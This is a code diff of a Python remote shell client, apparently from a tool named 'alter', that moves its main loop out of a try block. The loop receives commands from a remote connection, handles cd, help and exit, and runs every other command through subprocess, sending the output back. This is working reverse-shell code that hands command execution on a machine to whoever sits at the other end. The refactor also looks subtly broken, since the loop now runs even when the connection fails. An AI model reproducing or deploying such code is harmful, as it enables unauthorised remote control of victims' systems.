@@ -93,7 +93,6 @@ class Builtin:
         exit(0)
 
 
-
 if __name__ == '__main__':
     u = gp.getuser()
     h = socket.gethostname()
@@ -108,74 +107,66 @@ if __name__ == '__main__':
     try:
         c = Connection()
 
-        if Config.DEBUG:
-            print(f'[+] Connected to {c}')
-
-        # First message is the prompt alone (later should include some info)
-        lcl = prompt()
-
-        while True:
-            try:
-                # Send the local buffer
-                c.send(lcl.encode())
-
-                # Receive remote buffer and split arguments into a list
-                if not (rmt := c.recv().decode().split()):
-                    continue
-
-                # Handle builtins
-                if rmt[0] == 'cd':
-                    try:
-                        Builtin.cd(rmt[1])
-                        lcl = prompt()
-
-                    except Exception as x:
-                        lcl = f'[!] {type(x).__name__}: {x}\n{prompt()}'
-
-                        if Config.DEBUG:
-                            print(lcl)
-
-                elif rmt[0] == 'help':
-                    Builtin.help()
-
-                elif rmt[0] == 'exit':
-                    Builtin.exit(c)
-
-                # Execute subprocess and wait for it to finish
-                else:
-                    try:
-                        proc = sp.Popen(
-                            rmt,
-                            stdin = sp.PIPE, stdout = sp.PIPE, stderr = sp.PIPE
-                        )
-
-                        # Retrieve command output
-                        out, err = proc.communicate()
-
-                        lcl = f'{out.decode()}{err.decode()}' if (out or err) else ''
-
-                        # Append prompt to message
-                        r = proc.wait()
-                        lcl += f'{r}:{prompt()}' if r else prompt()
-
-                    except FileNotFoundError:
-                        lcl = f'[alter] Command not found\n{prompt()}'
-
-                        if Config.DEBUG:
-                            print(lcl)
-
-            except Exception as x:
-                lcl = f'[!] {type(x).__name__}: {x}\n{prompt()}'
-
-                if Config.DEBUG:
-                    print(lcl)
-
-        c.close()
-
     except Exception as x:
-        c.send(f'{type(x).__name__}: {x}'.encode())
-        c.close()
+        if Config.DEBUG:
+            print(f'{type(x).__name__}: {x}')
 
-    
+    if Config.DEBUG:
+        print(f'[+] Connected to {c}')
+
+    # First message is the prompt alone (later should include some info)
+    lcl = prompt()
+
+    while True:
+        try:
+            # Send the local buffer
+            c.send(lcl.encode())
+
+            # Receive remote buffer and split arguments into a list
+            if not (rmt := c.recv().decode().split()):
+                continue
+
+            # Handle builtins
+            if rmt[0] == 'cd':
+                try:
+                    Builtin.cd(rmt[1])
+                    lcl = prompt()
+
+                except Exception as x:
+                    lcl = f'[!] {type(x).__name__}: {x}\n{prompt()}'
+
+            elif rmt[0] == 'help':
+                Builtin.help()
+
+            elif rmt[0] == 'exit':
+                Builtin.exit(c)
+
+            # Execute subprocess and wait for it to finish
+            else:
+                try:
+                    proc = sp.Popen(
+                        rmt,
+                        stdin = sp.PIPE, stdout = sp.PIPE, stderr = sp.PIPE
+                    )
+
+                    # Retrieve command output
+                    out, err = proc.communicate()
+
+                    lcl = f'{out.decode()}{err.decode()}' if (out or err) else ''
+
+                    # Append prompt to message
+                    r = proc.wait()
+                    lcl += f'{r}:{prompt()}' if r else prompt()
+
+                except FileNotFoundError:
+                    lcl = f'[alter] Command not found\n{prompt()}'
+
+
+        except Exception as x:
+            lcl = f'[!] {type(x).__name__}: {x}\n{prompt()}'
+
+        if Config.DEBUG:
+            print(lcl)
+
     if Config.DEBUG:
         print('[-] Connection closed')
